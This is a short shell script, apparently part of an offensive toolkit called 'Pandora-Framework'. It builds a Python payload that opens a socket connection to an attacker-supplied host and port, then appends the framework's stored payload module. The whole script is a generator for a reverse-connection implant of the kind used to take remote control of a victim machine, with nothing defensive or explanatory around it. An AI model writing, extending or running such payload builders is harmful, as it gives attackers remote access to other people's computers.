echo "
import socket
import os
import subprocess

def connect():
    os.system('clear')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host ='$1'
    port = $2

" > $3
cat ~/Pandora-Framework/pandora/modules/payload >> $3
